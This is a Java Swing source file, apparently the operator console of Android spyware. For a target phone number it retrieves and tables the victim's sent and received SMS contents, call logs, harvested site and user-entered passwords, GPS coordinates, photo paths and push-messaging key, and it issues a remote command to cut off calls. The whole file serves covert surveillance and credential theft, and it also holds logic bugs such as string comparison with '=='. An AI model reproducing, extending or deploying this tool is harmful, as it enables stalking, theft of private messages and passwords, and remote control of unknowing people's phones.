package kr.kjw.ssm.masterprogram;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.util.ArrayList;
import java.util.Vector;

import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.table.DefaultTableModel;

import kr.kjw.ssm.masterprogram.call.CallInfoRequest;
import kr.kjw.ssm.masterprogram.calloff.CallOffRequest;
import kr.kjw.ssm.masterprogram.custom.CustomRequest;
import kr.kjw.ssm.masterprogram.network.NetworkGetRequest;
import kr.kjw.ssm.masterprogram.network.NetworkGetRequest.OnGetMethodProcessListener;
import kr.kjw.ssm.masterprogram.network.NetworkModel;
import kr.kjw.ssm.masterprogram.photo.PhotoRequest;
import kr.kjw.ssm.masterprogram.site.SiteRequest;
import kr.kjw.ssm.masterprogram.sms.SMSRecvRequest;
import kr.kjw.ssm.masterprogram.sms.SMSSendRequest;
import kr.kjw.ssm.masterprogram.user.UserInfoRequest;

public class MasterProgramMain implements ItemListener, ActionListener, OnGetMethodProcessListener<ArrayList<MasterData>> {

	private int USER = 0;
	private int SMSRECV = 1;
	private int SMSSEND = 2;
	private int SITE = 3;
	private int CUSTOM = 4;
	private int CALL = 5;
	private int CALLOFF = 6;
	private int PHOTO = 7;
	
	private ButtonGroup radioGroup;

	private JFrame frame;
	private JTextField phoneNumberInput_TextField;

	private JButton okButton;
	private JRadioButton userInfo_rb;
	private JRadioButton SMSRecv_rb;
	private JRadioButton SMSSend_rb;
	private JRadioButton CallInfo_rb;
	private JRadioButton SiteInfo_rb;
	private JRadioButton CustomInfo_rb;
	private JRadioButton CallOff_rb;
	private JRadioButton Photo_rb;
	
	private DefaultTableModel userInfoTableModel;
	private DefaultTableModel SMSSendTableModel;
	private DefaultTableModel SMSRecvTableModel;
	private DefaultTableModel callTableModel;
	private DefaultTableModel siteTableModel;
	private DefaultTableModel customTableModel;
	private DefaultTableModel photoTableModel;
	
	private int radioButtonItemFlag;
	
	private ArrayList<MasterData> userDataList;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					MasterProgramMain window = new MasterProgramMain();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public MasterProgramMain() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame();
		frame.setBounds(100, 100, 1189, 790);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.getContentPane().setLayout(null);

		phoneNumberInput_TextField = new JTextField();
		phoneNumberInput_TextField.setBounds(104, 30, 168, 28);
		frame.getContentPane().add(phoneNumberInput_TextField);
		phoneNumberInput_TextField.setColumns(10);

		JLabel lblPhonenumber = new JLabel("\uD578\uB4DC\uD3F0\uBC88\uD638");
		lblPhonenumber.setBounds(12, 33, 80, 21);
		frame.getContentPane().add(lblPhonenumber);

		userInfo_rb = new JRadioButton("\uC0AC\uC6A9\uC790 \uC815\uBCF4");
		userInfo_rb.setBounds(280, 21, 94, 23);
		frame.getContentPane().add(userInfo_rb);
		userInfo_rb.addItemListener(this);

		SMSRecv_rb = new JRadioButton("\uBB38\uC790 \uC218\uC2E0");
		SMSRecv_rb.setBounds(378, 21, 93, 23);
		frame.getContentPane().add(SMSRecv_rb);
		SMSRecv_rb.addItemListener(this);

		SMSSend_rb = new JRadioButton("\uBB38\uC790 \uBC1C\uC2E0");
		SMSSend_rb.setBounds(475, 21, 88, 23);
		frame.getContentPane().add(SMSSend_rb);
		SMSSend_rb.addItemListener(this);

		CallInfo_rb = new JRadioButton("\uD1B5\uD654 \uAE30\uB85D");
		CallInfo_rb.setBounds(567, 21, 83, 23);
		frame.getContentPane().add(CallInfo_rb);
		CallInfo_rb.addItemListener(this);

		SiteInfo_rb = new JRadioButton("\uC0AC\uC774\uD2B8 \uC815\uBCF4");
		SiteInfo_rb.setBounds(654, 21, 94, 23);
		frame.getContentPane().add(SiteInfo_rb);
		SiteInfo_rb.addItemListener(this);

		CustomInfo_rb = new JRadioButton("\uC0AC\uC6A9\uC790 \uC784\uC758 \uC815\uBCF4");
		CustomInfo_rb.setBounds(752, 21, 131, 23);
		frame.getContentPane().add(CustomInfo_rb);
		CustomInfo_rb.addItemListener(this);

		Photo_rb = new JRadioButton("\uC0AC\uC9C4");
		Photo_rb.setBounds(884, 21, 80, 23);
		frame.getContentPane().add(Photo_rb);
		Photo_rb.addItemListener(this);
		
		CallOff_rb = new JRadioButton("\uC804\uD654 \uB044\uAE30");
		CallOff_rb.setBounds(280, 46, 94, 23);
		frame.getContentPane().add(CallOff_rb);
		CallOff_rb.addItemListener(this);

		radioGroup = new ButtonGroup();
		radioGroup.add(userInfo_rb);
		radioGroup.add(SMSRecv_rb);
		radioGroup.add(SMSSend_rb);
		radioGroup.add(SiteInfo_rb);
		radioGroup.add(CustomInfo_rb);
		radioGroup.add(CallInfo_rb);
		radioGroup.add(CallOff_rb);
		radioGroup.add(Photo_rb);

		String[] userColumnName = { "핸드폰 번호", "통신사", "나라", "지역", "동", "X좌표", "Y좌표", "일시", "GCM Key" };
		userInfoTableModel = new DefaultTableModel(userColumnName, 0);
		JTable userInfoTable = new JTable(userInfoTableModel);
		JScrollPane userInfo_ScrollPane = new JScrollPane(userInfoTable);
		userInfo_ScrollPane.setBounds(12, 104, 551, 615);
		frame.getContentPane().add(userInfo_ScrollPane);
		
		String[] SMSSendColumnName = { "핸드폰 번호", "상대방 번호", "상대방 이름", "내용", "일시" };
		SMSSendTableModel = new DefaultTableModel(SMSSendColumnName, 0);
		JTable SMSSendTable = new JTable(SMSSendTableModel);
		JScrollPane SMSSend_ScrollPane = new JScrollPane(SMSSendTable);
		SMSSend_ScrollPane.setBounds(577, 104, 284, 185);
		frame.getContentPane().add(SMSSend_ScrollPane);

		String[] SMSRecvColumnName = { "핸드폰 번호", "상대방 번호", "상대방 이름", "내용", "일시" };
		SMSRecvTableModel = new DefaultTableModel(SMSRecvColumnName, 0);
		JTable SMSRecvTable = new JTable(SMSRecvTableModel);
		JScrollPane SMSRecv_ScrollPane = new JScrollPane(SMSRecvTable);
		SMSRecv_ScrollPane.setBounds(873, 104, 288, 185);
		frame.getContentPane().add(SMSRecv_ScrollPane);

		String[] callColumnName = { "핸드폰 번호", "상대방 번호", "상대방 이름", "일시" };
		callTableModel = new DefaultTableModel(callColumnName, 0);
		JTable callTable = new JTable(callTableModel);
		JScrollPane CallInfo_ScrollPane = new JScrollPane(callTable);
		CallInfo_ScrollPane.setBounds(575, 325, 286, 185);
		frame.getContentPane().add(CallInfo_ScrollPane);

		String[] siteColumnName = { "핸드폰 번호", "이름", "비밀번호" };
		siteTableModel = new DefaultTableModel(siteColumnName, 0);
		JTable siteTable = new JTable(siteTableModel);
		JScrollPane SiteInfo_ScrollPane = new JScrollPane(siteTable);
		SiteInfo_ScrollPane.setBounds(873, 325, 288, 185);
		frame.getContentPane().add(SiteInfo_ScrollPane);

		String[] customColumnName = { "핸드폰 번호", "이름", "비밀번호" };
		customTableModel = new DefaultTableModel(customColumnName, 0);
		JTable customTable = new JTable(customTableModel);
		JScrollPane CustomInfo_ScrollPane = new JScrollPane(customTable);
		CustomInfo_ScrollPane.setBounds(575, 550, 286, 169);
		frame.getContentPane().add(CustomInfo_ScrollPane);

		String[] photoColumnName = { "핸드폰 번호", "경로"};
		photoTableModel = new DefaultTableModel(photoColumnName, 0);
		JTable photoTable = new JTable(photoTableModel);
		JScrollPane Photo_scrollPane = new JScrollPane(photoTable);
		Photo_scrollPane.setBounds(873, 550, 288, 169);
		frame.getContentPane().add(Photo_scrollPane);
		
		okButton = new JButton("\uD655\uC778");
		okButton.setBounds(997, 25, 137, 37);
		frame.getContentPane().add(okButton);
		
		JLabel lblNewLabel = new JLabel("사용자 정보");
		lblNewLabel.setBounds(228, 75, 94, 15);
		frame.getContentPane().add(lblNewLabel);
		
		JLabel lblNewLabel_1 = new JLabel("문자 발신 정보");
		lblNewLabel_1.setBounds(672, 75, 100, 15);
		frame.getContentPane().add(lblNewLabel_1);
		
		JLabel lblNewLabel_2 = new JLabel("문자 수신 정보");
		lblNewLabel_2.setBounds(976, 79, 94, 15);
		frame.getContentPane().add(lblNewLabel_2);
		
		JLabel lblNewLabel_3 = new JLabel("통화 기록 정보");
		lblNewLabel_3.setBounds(672, 300, 94, 15);
		frame.getContentPane().add(lblNewLabel_3);
		
		JLabel lblNewLabel_4 = new JLabel("사이트 정보");
		lblNewLabel_4.setBounds(986, 299, 84, 15);
		frame.getContentPane().add(lblNewLabel_4);
		
		JLabel lblNewLabel_5 = new JLabel("사용자 입력 정보");
		lblNewLabel_5.setBounds(672, 525, 110, 15);
		frame.getContentPane().add(lblNewLabel_5);
		
		JLabel lblNewLabel_6 = new JLabel("사진 정보");
		lblNewLabel_6.setBounds(984, 525, 86, 15);
		frame.getContentPane().add(lblNewLabel_6);
		okButton.addActionListener(this);
		
	}

	@SuppressWarnings("unchecked")
	@Override
	public void actionPerformed(ActionEvent ae) {
		String phoneNumber = phoneNumberInput_TextField.getText();
		
		if (ae.getSource() == okButton) {
			
			if(radioButtonItemFlag == USER) {
				System.out.println("BB");
				UserInfoRequest userRequest = new UserInfoRequest(new ArrayList<MasterData>(), phoneNumber);
				userRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(userRequest);
			} else if (radioButtonItemFlag == SMSRECV) {
				SMSRecvRequest callRequest = new SMSRecvRequest(new ArrayList<MasterData>(), phoneNumber);
				callRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(callRequest);				
			} else if (radioButtonItemFlag == SMSSEND) {
				SMSSendRequest callRequest = new SMSSendRequest(new ArrayList<MasterData>(), phoneNumber);
				callRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(callRequest);			
			} else if (radioButtonItemFlag == CALL) {
				CallInfoRequest callRequest = new CallInfoRequest(new ArrayList<MasterData>(), phoneNumber);
				callRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(callRequest);
			} else if (radioButtonItemFlag == SITE) {
				SiteRequest siteRequest = new SiteRequest(new ArrayList<MasterData>(), phoneNumber);
				siteRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(siteRequest);
			} else if (radioButtonItemFlag == CUSTOM) {
				CustomRequest customRequest = new CustomRequest(new ArrayList<MasterData>(), phoneNumber);
				customRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(customRequest);		
			} else if (radioButtonItemFlag == CALLOFF) {
				int userIndex;
				for(userIndex=0;userIndex<userDataList.size();userIndex++) {
					if(userDataList.get(userIndex).phoneNumber == phoneNumber)
						break;
				}
				MasterData queryData = new MasterData();
				queryData.phoneNumber = phoneNumber;
				queryData.gcmKey = ((Vector<String>) userInfoTableModel.getDataVector().elementAt(userIndex-1)).elementAt(8);
				
				CallOffRequest callOffRequest = new CallOffRequest(new ArrayList<MasterData>(), queryData);
				callOffRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(callOffRequest);
			} else if (radioButtonItemFlag == PHOTO) {
				System.out.println("AA");
				PhotoRequest photoRequest = new PhotoRequest(new ArrayList<MasterData>(), phoneNumber);
				photoRequest.setOnGetMethodProcessListener(this);
				NetworkModel.getInstance().enqueue(photoRequest);
			}
		}
	}

	@Override
	public void itemStateChanged(ItemEvent ae) {
		if (ae.getSource() == userInfo_rb) {
			radioButtonItemFlag = USER;
		} else if (ae.getSource() == SMSRecv_rb) {
			radioButtonItemFlag = SMSRECV;
		} else if (ae.getSource() == SMSSend_rb) {
			radioButtonItemFlag = SMSSEND;
		} else if (ae.getSource() == CallInfo_rb) {
			radioButtonItemFlag = CALL;
		} else if (ae.getSource() == SiteInfo_rb) {
			radioButtonItemFlag = SITE;
		} else if (ae.getSource() == CustomInfo_rb) {
			radioButtonItemFlag = CUSTOM;
		} else if (ae.getSource() == CallOff_rb) {
			radioButtonItemFlag = CALLOFF;
		} else if (ae.getSource() == Photo_rb) {
			radioButtonItemFlag = PHOTO;
		}
	}

	@Override
	public void onGetMethodProcessSuccess(NetworkGetRequest<ArrayList<MasterData>> request) {
		ArrayList<MasterData> data = request.getResult();

		if(request instanceof CallInfoRequest) {
			System.out.println(callTableModel.getRowCount());
			if(callTableModel.getRowCount() > 0) {
				for (int i = 0; i< callTableModel.getRowCount();i++)
					callTableModel.removeRow(i);
			}
			
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[4];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).otherNumber;
				arr[2] = data.get(i).otherName;
				arr[3] = data.get(i).date;

				callTableModel.addRow(arr);
			}
		} else if (request instanceof SiteRequest) {
			
			if(siteTableModel.getRowCount() > 0) {
				for (int i = 0; i< siteTableModel.getRowCount();i++)
					siteTableModel.removeRow(i);
			}
			
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[4];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).name;
				arr[2] = data.get(i).password;
				siteTableModel.addRow(arr);
			}
		} else if (request instanceof CustomRequest) {
			
			if(customTableModel.getRowCount() > 0) {
				for (int i = 0; i< customTableModel.getRowCount();i++)
					customTableModel.removeRow(i);
			}
			
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[4];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).name;
				arr[2] = data.get(i).password;
				customTableModel.addRow(arr);
			}
		}else if (request instanceof UserInfoRequest) {
			
			if(userInfoTableModel.getRowCount() > 0) {
				for (int i = 0; i< userInfoTableModel.getRowCount();i++)
					userInfoTableModel.removeRow(i);
			}
			
			userDataList = data;
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[9];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).agency;
				arr[2] = data.get(i).countryName;
				arr[3] = data.get(i).cityName;
				arr[4] = data.get(i).townName;
				arr[5] = data.get(i).longitude;
				arr[6] = data.get(i).latitude;
				arr[7] = data.get(i).date;
				arr[8] = data.get(i).gcmKey;
				userInfoTableModel.addRow(arr);
			}
		} else if (request instanceof SMSRecvRequest) {
			
			if(SMSRecvTableModel.getRowCount() > 0) {
				for (int i = 0; i< SMSRecvTableModel.getRowCount();i++)
					SMSRecvTableModel.removeRow(i);
			}
			
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[5];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).otherNumber;
				arr[2] = data.get(i).otherName;
				arr[3] = data.get(i).contents;
				arr[4] = data.get(i).date;
				SMSRecvTableModel.addRow(arr);
			}
		} else if (request instanceof SMSSendRequest) {
			
			if(SMSSendTableModel.getRowCount() > 0) {
				for (int i = 0; i< SMSSendTableModel.getRowCount();i++)
					SMSSendTableModel.removeRow(i);
			}
			
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[5];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).otherNumber;
				arr[2] = data.get(i).otherName;
				arr[3] = data.get(i).contents;
				arr[4] = data.get(i).date;
				SMSSendTableModel.addRow(arr);
			}
		} else if (request instanceof PhotoRequest) {
			
			if(photoTableModel.getRowCount() > 0) {
				for (int i = 0; i< photoTableModel.getRowCount();i++)
					photoTableModel.removeRow(i);
			}
			
			for(int i=0;i<data.size();i++) {
				String arr[] = new String[2];
				arr[0] = data.get(i).phoneNumber;
				arr[1] = data.get(i).photoUrl;
				photoTableModel.addRow(arr);
			}
		} 
	}

	@Override
	public void onGetMethodProcessError() {
		
	}
}
